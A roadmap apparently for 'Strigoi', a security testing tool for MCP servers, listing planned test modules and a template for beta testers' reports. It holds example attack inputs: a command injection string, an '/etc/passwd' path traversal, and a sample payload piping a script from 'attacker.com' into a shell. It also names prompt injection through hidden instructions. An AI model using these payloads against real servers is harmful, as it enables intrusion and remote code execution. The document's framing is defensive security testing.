# Strigoi Module Implementation Roadmap

## Release Strategy
- **Implemented**: Ready for beta testing
- **Not Implemented**: Identified but manual testing required
- **Beta Feedback**: Users tell us automation priorities

## Module Status for Beta Release

### ✅ Implemented Modules
```
mcp/discovery/tools_list       - Enumerate exposed tools
mcp/discovery/prompts_list     - Discover available prompts  
mcp/discovery/resources_list   - List accessible resources
mcp/attack/auth_bypass         - Test authentication bypasses
mcp/attack/rate_limit          - Check rate limiting
```

### 🔄 Not Implemented (Manual Testing Required)

#### Critical Priority
```
mcp/validation/command_injection   [NOT IMPLEMENTED]
Manual test: Try payloads like "; ls" in tool parameters
Beta feedback needed: Which tools are most vulnerable?

mcp/validation/prompt_injection    [NOT IMPLEMENTED]  
Manual test: Hidden instructions in documents/images
Beta feedback needed: Effective detection patterns?

mcp/auth/token_scope_analyzer     [NOT IMPLEMENTED]
Manual test: Check if tokens have excessive permissions
Beta feedback needed: Common over-scoping patterns?
```

#### High Priority
```
mcp/protocol/jsonrpc_fuzzer       [NOT IMPLEMENTED]
Manual test: Send malformed JSON-RPC requests
Beta feedback needed: Which implementations crash?

mcp/state/session_security        [NOT IMPLEMENTED]
Manual test: Try predictable session IDs, fixation
Beta feedback needed: Common session storage locations?

mcp/access/path_traversal         [NOT IMPLEMENTED]
Manual test: "../../../etc/passwd" in file parameters
Beta feedback needed: Which MCP servers are vulnerable?
```

#### Medium Priority
```
mcp/state/race_condition_detector  [NOT IMPLEMENTED]
Manual test: Concurrent requests to same resource
Beta feedback needed: Timing-sensitive operations?

mcp/dos/resource_exhaustion       [NOT IMPLEMENTED]
Manual test: Large payloads, infinite loops
Beta feedback needed: Resource limits in practice?

mcp/protocol/version_downgrade    [NOT IMPLEMENTED]
Manual test: Force older protocol versions
Beta feedback needed: Version negotiation flaws?
```

## Beta Tester Guidance

### For Each "NOT IMPLEMENTED" Module:

1. **What to Test Manually**
   - Clear steps for manual verification
   - Example payloads and techniques
   - Expected vulnerable behaviors

2. **What to Report Back**
   - Which MCP servers are vulnerable
   - Specific payload variations that work
   - False positive patterns to avoid
   - Automation suggestions

3. **Risk Assessment**
   - Severity in your environment
   - Frequency of occurrence
   - Business impact if exploited

## Example Beta Feedback Template

```markdown
Module: mcp/validation/command_injection
MCP Server Tested: continue-mcp v1.2.3
Vulnerable: YES

Working Payload: 
- Tool: convertImage
- Parameter: "; curl attacker.com/steal.sh | sh"
- Result: Remote code execution achieved

Automation Suggestion:
- Test common shell metacharacters: ; | & ` $()
- Check all string parameters in tools
- Look for os.system(), exec(), subprocess calls

Priority: CRITICAL for our environment
```

## Benefits of This Approach

1. **Faster Beta Release**: Core recon works, advanced attacks manual
2. **Real-World Validation**: Beta users test against actual MCP servers
3. **Prioritized Development**: Build what users actually need
4. **Community Intelligence**: Crowd-sourced vulnerability discovery
5. **Defensive Empowerment**: Even manual tests help secure systems

## Post-Beta Development Priority

Based on feedback, implement modules in order of:
1. Most commonly found vulnerabilities
2. Highest impact attacks
3. Easiest to automate reliably
4. Most requested by community

## Message to Beta Users

"We've identified these attack vectors but need YOUR help prioritizing automation. Test these manually against your MCP servers (in authorized environments only!) and tell us:
- What worked?
- What's most critical?
- How should we automate it?

Your feedback directly shapes Strigoi's development!"